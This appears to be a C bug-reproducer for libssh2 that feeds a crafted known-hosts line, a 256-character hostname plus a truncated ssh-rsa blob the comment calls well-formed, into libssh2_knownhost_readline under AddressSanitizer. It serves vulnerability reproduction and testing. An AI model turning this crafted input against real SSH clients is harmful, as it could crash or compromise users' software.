/* Parse a crafted known-hosts entry through the public API.
 *
 * The entry carries a plain (legacy-format) hostname that is exactly 256
 * characters long, followed by a well-formed ssh-rsa key blob.
 *
 * Build: cc -g -O1 -fsanitize=address -I<inc> newbug.c <libssh2>.a -lcrypto -lz
 */
#include <libssh2.h>

#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *kh;
    char line[512];
    size_t hostlen = 256;
    int rc;
    int i;

    libssh2_init(0);

    session = libssh2_session_init();
    if(!session)
        return 1;

    kh = libssh2_knownhost_init(session);
    if(!kh)
        return 1;

    for(i = 0; i < (int)hostlen; i++)
        line[i] = 'A';
    strcpy(line + hostlen, " ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC");

    rc = libssh2_knownhost_readline(kh, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    printf("readline rc=%d\n", rc);

    libssh2_knownhost_free(kh);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
